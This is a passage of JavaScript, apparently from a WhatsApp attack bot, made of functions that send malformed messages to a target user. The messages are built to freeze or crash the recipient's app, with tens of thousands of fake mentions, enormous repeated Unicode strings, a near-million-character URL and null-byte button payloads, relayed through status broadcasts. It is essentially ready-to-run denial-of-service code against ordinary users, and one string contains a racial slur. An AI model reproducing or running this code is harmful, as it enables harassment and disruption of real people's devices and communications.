        }
      }
    }, {});

    await Prime.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
}
async function protocolbug8(target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Assalamualaikum Sholat Yu" + "ោ៝".repeat(10000),
        title: "Hai Aku ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟メ"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    for (const msg of [msg1, msg2, msg3]) {
        await Prime.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }
}
async function ButtonHardInvisible(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

const aeterishere = {
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
    "fileLength": "327833",
    "seconds": 15,
    "mediaKey": "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
    "caption": "Xrelly Mp5",
    "height": 1248,
    "width": 704,
    "fileEncSha256": "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
    "directPath": "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1748347294",
    "contextInfo": { isSampled: true, mentionedJid: mentionedList },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363321780343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "Kita Usahakan Nanti.Mp4"
        },
    "streamingSidecar": "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
    "thumbnailDirectPath": "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
    "thumbnailSha256": "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
    "thumbnailEncSha256": "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
    "annotations": [
      {
        "embeddedContent": {
          "embeddedMusic": {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "BIYALUE2",
        title: "AETER SONG",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
          }
        },
        "embeddedAction": true
      }
    ]
  }
}

    const aetermusic = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
           contextInfo: {
           mentionedJid: mentionedList,
            caption: "Yahoo",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
           }
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { aeterishere } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, aetermusic, {});
  
    for (const msg of [msg1, msg2]) {
        await Prime.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await Prime.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}           

async function broadcastpayload(target) {
  const comboxUrl = "https://" + "ꦾ".repeat(500) + ".com/" + "ꦾ".repeat(911700);

  await Prime.relayMessage(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: Buffer.from("9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=", "base64"),
      fileLength: "20000000",
      seconds: 300,
      mediaKey: Buffer.from("JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=", "base64"),
      caption: "\u200D".repeat(1000),
      height: 1080,
      width: 1920,
      fileEncSha256: Buffer.from("HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=", "base64"),
      directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743742853",
      contextInfo: {
        isSampled: true,
        mentionedJid: [
          target,
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 30000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          )
        ],
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363194914375334@newsletter",
          serverMessageId: "3EB0ABCDEF123456789",
          newsletterName: "ko lu gt"
        }
      },
      streamingSidecar: Buffer.from("Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=", "base64"),
      thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
      thumbnailSha256: Buffer.from("vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=", "base64"),
      thumbnailEncSha256: Buffer.from("dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=", "base64"),
      jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3", "base64"),
      annotations: [
        {
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "ko lu gt",
              songId: "Aeternyx",
              author: "\u9999",
              title: "\u9999",
              artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
              artworkSha256: Buffer.from("u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=", "base64"),
              artworkEncSha256: Buffer.from("fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=", "base64"),
              artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
              countryBlocklist: true,
              isExplicit: true,
              artworkMediaKey: Buffer.from("kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=", "base64")
            }
          },
          embeddedAction: true
        }
      ]
    },
    templateButtons: [
      {
        index: 1,
        urlButton: {
          displayText: "\u200D".repeat(9741),
          url: comboxUrl
        }
      }
    ]
  }, {
    quoted: {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        paymentInviteMessage: {
          serviceType: 1,
          expiryTimestamp: null
        }
      }
    }
  });
}
async function xatanicaldelayv2(target, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Prime.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function DelaySsuper(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Aeternyx Prime🔥",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Prime.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
    if (mention) {
        await Prime.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Ngewe Yu" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function ovaliuminvictus(target, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Prime.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function location(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: 'p',
                    degreesLongitude: 'p',
                    caption: "AETERNYX KILL YOU",
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await Prime.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
}
async function frezbuttoninvis(target) {
    const spamMessage = "@1".repeat(10200);
    const crashMessage = "ꦽ".repeat(10200);
    
    
    const MSG = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: "'Aeternyx Is Here 😈",
                    previewType: "Hola 🤣",
                    contextInfo: {
                        mentionedJid: [
                            target,
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 30000 },
                                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            ),
                        ],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                    },
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await Prime.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await Prime.relayMessage(
        target,
        {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "WTF you Lookin at, nigga" },
                    content: undefined
                }
            ]
        }
    );
}
async function invisblekontak(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: "Mamia",
                    vcard: `BEGIN:VCARD
VERSION:3.0
FN:Yukina
TEL;type=CELL;type=VOICE;waid=6287878064688:+62 878-7806-4688
END:VCARD`,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Prime.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function megaCrashFusion(target) {
    const overButton = Array.from({ length: 9696 }, (_, r) => ({
        title: "᭄".repeat(9696),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const extremeNativeFlowButtons = [
        { name: "single_select", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_url", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_call", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_copy", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_reminder", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_cancel_reminder", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "address_message", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "send_location", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "quick_reply", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "mpm", buttonParamsJson: "\u0000".repeat(90000) },
    ];

    const combinedViewOncePayload = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "꓄ꍏꀘꍏ",
                    listType: 2,
                    buttonText: null,
                    sections: overButton,
                    singleSelectReply: { selectedRowId: "🪅" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9696 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9696,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9696@newsletter",
                            serverMessageId: 1,
                            newsletterName: "----default"
                        },
                        interactiveAnnotations: extremeNativeFlowButtons
                    },
                    description: "default"
                },
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [{
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "eek",
                                songId: "cuih",
                                author: "Aeternyx Glory",
                                title: "Amba",
                                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                countryBlocklist: true,
                                isExplicit: true,
                                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                            }
                        }
                    }]
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const fused = generateWAMessageFromContent(target, combinedViewOncePayload, {});
    
    await Prime.relayMessage("status@broadcast", fused.message, {
        messageId: fused.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
}

async function Nulllock(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "NullLockYou",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

